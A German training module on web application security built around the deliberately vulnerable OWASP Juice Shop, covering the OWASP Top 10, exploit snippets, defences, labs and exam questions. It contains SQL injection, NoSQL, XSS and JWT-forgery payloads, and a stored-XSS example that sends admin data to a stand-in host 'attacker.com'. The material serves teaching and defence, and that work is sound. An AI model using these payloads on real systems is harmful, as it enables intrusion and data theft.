# 🎓 OWASP Juice Shop - IT-Security Schulungsgrundlagen

## 📖 Inhaltsverzeichnis

1. [Einführung in Web Application Security](#einführung)
2. [OWASP Top 10 Vulnerabilities](#owasp-top-10)
3. [Praktische Exploit-Techniken](#exploit-techniken)
4. [Defensive Maßnahmen](#defensive-maßnahmen)
5. [Hands-on Labs](#hands-on-labs)

## 🛡️ Einführung in Web Application Security

### Was ist Web Application Security?

Web Application Security umfasst alle Maßnahmen zum Schutz von Webanwendungen vor:
- **Injection Attacks** (SQL, NoSQL, Command)
- **Authentication Bypass**
- **Session Management Flaws**
- **Cross-Site Scripting (XSS)**
- **Broken Access Control**

### Warum ist Security wichtig?

📊 **Statistiken:**
- 43% aller Cyberangriffe zielen auf kleine Unternehmen
- Webanwendungen sind in 75% der Fälle das Angriffsziel
- Durchschnittlicher Schaden: 3,86 Millionen USD pro Breach

## 🎯 OWASP Top 10 Vulnerabilities (2021)

### 1. Broken Access Control
**Beschreibung:** Nutzer können auf nicht autorisierte Funktionen zugreifen

**Beispiel in Juice Shop:**
```javascript
// Unsicherer Code
app.get('/admin', (req, res) => {
    // Keine Autorisierungsprüfung!
    res.render('admin-panel');
});

// Sicherer Code
app.get('/admin', requireAuth, requireRole('admin'), (req, res) => {
    res.render('admin-panel');
});
```

**Automatisierter Exploit:**
```python
# Direkter Admin-Zugriff ohne Authentifizierung
def exploit_admin_access():
    response = requests.get(f"{base_url}/admin")
    if "Admin Panel" in response.text:
        return True  # Exploit erfolgreich
```

### 2. Cryptographic Failures
**Beschreibung:** Schwache oder fehlende Verschlüsselung

**Häufige Probleme:**
- Klartext-Speicherung von Passwörtern
- Schwache Hash-Algorithmen (MD5, SHA1)
- Hardcoded Secrets

**Juice Shop Beispiel:**
```python
# MD5 Hash Cracking
def crack_md5_password(hash_value):
    wordlist = ["admin", "password", "123456"]
    for password in wordlist:
        if hashlib.md5(password.encode()).hexdigest() == hash_value:
            return password
```

### 3. Injection
**Beschreibung:** Unvalidierte Eingaben ermöglichen Code-Injection

#### SQL Injection
```sql
-- Vulnerable Query
SELECT * FROM users WHERE email = '" + userInput + "'

-- Malicious Input: admin@juice-sh.op'--
-- Results in: SELECT * FROM users WHERE email = 'admin@juice-sh.op'--'
```

**Automatisierte SQL Injection:**
```python
def sql_injection_login():
    payloads = [
        "admin@juice-sh.op'--",
        "' OR '1'='1'--",
        "' UNION SELECT * FROM users--"
    ]
    
    for payload in payloads:
        response = login_attempt(payload, "anything")
        if "Welcome" in response.text:
            return payload  # Successful exploit
```

#### NoSQL Injection
```javascript
// Vulnerable MongoDB Query
db.users.find({email: req.body.email, password: req.body.password})

// Malicious Payload
{"email": {"$gt": ""}, "password": {"$gt": ""}}
```

### 4. Insecure Design
**Beschreibung:** Grundlegende Designfehler in der Anwendungsarchitektur

### 5. Security Misconfiguration
**Beschreibung:** Unsichere Standardkonfigurationen

**Beispiele:**
- Debug-Modus in Produktion
- Ungesicherte Cloud-Storage
- Fehlende Security Headers

### 6. Vulnerable and Outdated Components
**Beschreibung:** Verwendung veralteter Libraries mit bekannten Vulnerabilities

### 7. Identification and Authentication Failures
**Beschreibung:** Schwache Authentifizierung und Session Management

**JWT Token Manipulation:**
```python
def jwt_none_algorithm_attack(original_token):
    # Dekodiere original Token
    header, payload, signature = original_token.split('.')
    
    # Ändere Algorithmus zu "none"
    new_header = {"alg": "none", "typ": "JWT"}
    
    # Erstelle Admin Payload
    admin_payload = {"user": "admin", "role": "administrator"}
    
    # Erstelle neuen Token ohne Signatur
    malicious_token = f"{base64_encode(new_header)}.{base64_encode(admin_payload)}."
    
    return malicious_token
```

### 8. Software and Data Integrity Failures
**Beschreibung:** Code- und Infrastrukturschwächen bei Updates

### 9. Security Logging and Monitoring Failures
**Beschreibung:** Unzureichende Logging und Monitoring

### 10. Server-Side Request Forgery (SSRF)
**Beschreibung:** Server führt unvalidierte Requests aus

## 💻 Praktische Exploit-Techniken

### SQL Injection Deep-Dive

#### 1. Error-Based SQL Injection
```python
def error_based_sqli():
    # Provoziere SQL Fehler für Information Gathering
    payloads = [
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ]
```

#### 2. Union-Based SQL Injection
```python
def union_based_sqli():
    # Extrahiere Daten über UNION SELECT
    payload = "' UNION SELECT username,password,email,1,2,3,4,5 FROM users--"
    return execute_payload(payload)
```

#### 3. Boolean-Based Blind SQL Injection
```python
def blind_sqli_boolean():
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    extracted_data = ""
    
    for position in range(1, 20):  # Max 20 Zeichen
        for char in alphabet:
            payload = f"admin' AND SUBSTRING((SELECT password FROM users WHERE email='admin@juice-sh.op'), {position}, 1)='{char}'--"
            
            if test_payload(payload):
                extracted_data += char
                break
                
    return extracted_data
```

### Cross-Site Scripting (XSS)

#### 1. Reflected XSS
```javascript
// Vulnerable Code
app.get('/search', (req, res) => {
    res.send(`<h1>Search Results for: ${req.query.q}</h1>`);
});

// Exploit URL
// /search?q=<script>alert('XSS')</script>
```

#### 2. Stored XSS
```python
def stored_xss_exploit():
    malicious_comment = "<script>fetch('/admin/users').then(r=>r.text()).then(data=>fetch('http://attacker.com/steal?data='+btoa(data)))</script>"
    
    submit_feedback({
        "comment": malicious_comment,
        "rating": 5
    })
```

#### 3. DOM-Based XSS
```javascript
// Vulnerable Client-Side Code
document.getElementById('output').innerHTML = location.hash.substring(1);

// Exploit URL
// page.html#<img src=x onerror=alert('XSS')>
```

### Authentication Bypass Techniken

#### 1. JWT Token Manipulation
```python
def jwt_manipulation_attacks():
    attacks = [
        jwt_none_algorithm_attack,
        jwt_weak_secret_bruteforce,
        jwt_kid_manipulation,
        jwt_algorithm_confusion
    ]
    
    for attack in attacks:
        result = attack()
        if result['success']:
            return result
```

#### 2. Session Fixation
```python
def session_fixation_attack():
    # 1. Erhalte Session ID
    session_id = get_new_session()
    
    # 2. Verleite Opfer zur Verwendung dieser Session
    malicious_link = f"http://juice-shop.com/login?sessionid={session_id}"
    
    # 3. Nach Login des Opfers: Hijack Session
    return hijack_session(session_id)
```

## 🛡️ Defensive Maßnahmen

### Input Validation
```python
def secure_input_validation(user_input):
    # Whitelist Approach
    allowed_chars = re.compile(r'^[a-zA-Z0-9@._-]+$')
    
    if not allowed_chars.match(user_input):
        raise ValueError("Invalid input characters")
    
    # Length Validation
    if len(user_input) > 100:
        raise ValueError("Input too long")
    
    # SQL Injection Prevention
    return escape_sql(user_input)
```

### Prepared Statements
```python
# Vulnerable
query = f"SELECT * FROM users WHERE email = '{email}'"

# Secure
query = "SELECT * FROM users WHERE email = ?"
cursor.execute(query, (email,))
```

### Output Encoding
```python
def secure_output_encoding(user_content):
    # HTML Entity Encoding
    import html
    return html.escape(user_content)
```

### JWT Security
```python
def secure_jwt_implementation():
    return {
        "algorithm": "RS256",  # Asymmetrisch, nicht HS256
        "secret": os.environ.get('JWT_SECRET'),  # Aus Umgebungsvariablen
        "expiration": 3600,  # 1 Stunde
        "issuer": "juice-shop.com",
        "audience": "juice-shop-users"
    }
```

## 🧪 Hands-on Labs

### Lab 1: SQL Injection Discovery

**Aufgabe:** Finde SQL Injection in der Suchfunktion

**Schritte:**
1. Öffne Juice Shop: `http://localhost:3000`
2. Navigiere zur Suchfunktion
3. Teste Payloads:
   - `'`
   - `' OR '1'='1'--`
   - `' UNION SELECT null,null,null--`

**Automatisierung:**
```bash
python main.py --category injection --verbose
```

### Lab 2: JWT Token Manipulation

**Aufgabe:** Erlange Admin-Zugriff durch JWT-Manipulation

**Schritte:**
1. Logge dich als normaler User ein
2. Extrahiere JWT Token aus Browser
3. Dekodiere Token: `jwt.io`
4. Manipuliere Payload für Admin-Rechte

**Automatisierung:**
```bash
python main.py --category authentication --verbose
```

### Lab 3: XSS in Feedback Form

**Aufgabe:** Führe XSS über Feedback-Formular aus

**Schritte:**
1. Navigiere zu Contact/Feedback
2. Teste XSS Payloads:
   - `<script>alert('XSS')</script>`
   - `<img src=x onerror=alert('XSS')>`

## 📊 Challenge Difficulty Matrix

| Kategorie | Anfänger (⭐) | Mittel (⭐⭐⭐) | Experte (⭐⭐⭐⭐⭐⭐) |
|-----------|---------------|---------------|-------------------|
| **Injection** | Basic SQL Injection | Blind SQL Injection | Second-Order SQL Injection |
| **Auth** | Weak Passwords | JWT Manipulation | Advanced Token Attacks |
| **XSS** | Reflected XSS | Stored XSS | DOM-XSS with CSP Bypass |

## 🎯 Prüfungsfragen

### Multiple Choice

1. **Welche SQL Injection Payload ermöglicht Admin Login?**
   - A) `admin@juice-sh.op`
   - B) `admin@juice-sh.op'--`
   - C) `admin@juice-sh.op' AND 1=1`
   - D) `admin@juice-sh.op' OR 1=2`

   **Antwort: B** - Der `--` kommentiert den Rest der Query aus

2. **Was ist der sicherste JWT Algorithmus?**
   - A) none
   - B) HS256
   - C) RS256
   - D) MD5

   **Antwort: C** - RS256 verwendet asymmetrische Kryptographie

### Praktische Aufgaben

1. **Schreibe einen Python-Script zur automatischen SQL Injection Detection**
2. **Implementiere XSS-Filter für User Input**
3. **Erstelle JWT Token Validator**

## 📚 Weiterführende Ressourcen

### Online-Kurse
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Damn Vulnerable Web Application (DVWA)](http://www.dvwa.co.uk/)

### Bücher
- "The Web Application Hacker's Handbook" - Dafydd Stuttard
- "Real-World Bug Hunting" - Peter Yaworski
- "The Tangled Web" - Michal Zalewski

### Tools
- **Burp Suite** - Web Application Security Testing
- **OWASP ZAP** - Open Source Security Scanner
- **sqlmap** - Automatic SQL Injection Tool

## ⚠️ Ethik und Legalität

### ✅ Erlaubte Aktivitäten
- Tests an OWASP Juice Shop
- Tests an eigenen Systemen
- Autorisierte Penetration Tests
- Bug Bounty Programme

### ❌ Verbotene Aktivitäten
- Tests ohne Erlaubnis
- Schäden an fremden Systemen
- Datendiebstahl
- Illegale Aktivitäten

### 📋 Best Practices
1. **Immer Erlaubnis einholen**
2. **Scope definieren**
3. **Dokumentation führen**
4. **Responsible Disclosure**

---

**🎓 Ende des Grundlagen-Moduls. Nächste Schritte: Praktische Labs und Hands-on Übungen!**